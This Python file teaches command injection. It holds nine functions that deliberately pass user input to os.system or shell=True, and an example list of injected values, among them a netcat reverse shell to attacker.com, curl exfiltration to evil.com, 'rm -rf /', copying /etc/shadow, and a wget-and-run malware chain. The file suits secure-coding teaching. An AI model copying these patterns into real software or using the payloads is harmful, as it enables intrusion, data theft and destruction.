"""
Example: Command Injection Vulnerability
This code demonstrates command injection vulnerabilities in Python
"""

import os
import subprocess


def ping_host(hostname):
    """
    VULNERABLE: Command injection via os.system()
    User input is directly passed to shell
    """
    command = f"ping -c 4 {hostname}"
    os.system(command)  # VULNERABLE: Executes in shell


def check_file_exists(filename):
    """
    VULNERABLE: Command injection via subprocess with shell=True
    """
    command = f"test -f {filename} && echo 'exists' || echo 'not found'"
    result = subprocess.run(command, shell=True, capture_output=True)  # VULNERABLE
    return result.stdout.decode()


def list_directory(directory):
    """
    VULNERABLE: Command injection in ls command
    """
    os.system(f"ls -la {directory}")  # VULNERABLE


def search_logs(search_term):
    """
    VULNERABLE: Command injection via grep
    """
    command = f"grep '{search_term}' /var/log/app.log"
    os.system(command)  # VULNERABLE


def compress_file(filename, output):
    """
    VULNERABLE: Multiple injection points
    """
    os.system(f"tar -czf {output} {filename}")  # VULNERABLE


def get_user_info(username):
    """
    VULNERABLE: Command injection in user lookup
    """
    command = f"id {username}"
    result = subprocess.check_output(command, shell=True)  # VULNERABLE
    return result.decode()


def download_file(url, destination):
    """
    VULNERABLE: Command injection in wget/curl
    """
    os.system(f"wget {url} -O {destination}")  # VULNERABLE


def backup_database(db_name, backup_path):
    """
    VULNERABLE: Command injection in database backup
    """
    command = f"mysqldump -u root {db_name} > {backup_path}"
    os.system(command)  # VULNERABLE


def process_image(image_path, output_path):
    """
    VULNERABLE: Command injection in image processing
    """
    command = f"convert {image_path} -resize 800x600 {output_path}"
    subprocess.run(command, shell=True)  # VULNERABLE


"""
Example exploitation scenarios:

1. Basic command injection:
   hostname = "google.com; cat /etc/passwd"
   ping_host(hostname)
   Result: Pings google.com, then displays /etc/passwd

2. Command chaining:
   filename = "test.txt && rm -rf /"
   check_file_exists(filename)
   Result: Checks test.txt, then attempts to delete everything

3. Background execution:
   search_term = "error' & nc attacker.com 4444 -e /bin/sh &"
   search_logs(search_term)
   Result: Opens reverse shell to attacker

4. Data exfiltration:
   username = "root; curl http://evil.com/$(whoami)"
   get_user_info(username)
   Result: Sends current username to attacker's server

5. Privilege escalation:
   directory = "/tmp; sudo su -"
   list_directory(directory)
   Result: Lists /tmp, then attempts to escalate privileges

6. File operations:
   output = "backup.tar.gz; cp /etc/shadow /tmp/shadow.txt"
   compress_file("data/", output)
   Result: Creates backup, then copies shadow file

7. Remote code execution:
   url = "http://example.com/file.txt; wget http://evil.com/malware.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh"
   download_file(url, "/tmp/file.txt")
   Result: Downloads and executes malware

The key vulnerability pattern is using shell=True or os.system() with
user-controllable input. Attackers can inject shell metacharacters like:
- ; (command separator)
- && (conditional execution)
- || (alternative execution)
- | (pipe)
- ` (command substitution)
- $() (command substitution)
- > < (redirection)
- & (background execution)
"""

if __name__ == "__main__":
    print("WARNING: This code contains intentional command injection vulnerabilities!")
    print("For educational purposes only!")
    print("\nNEVER use shell=True or os.system() with user input in production!")
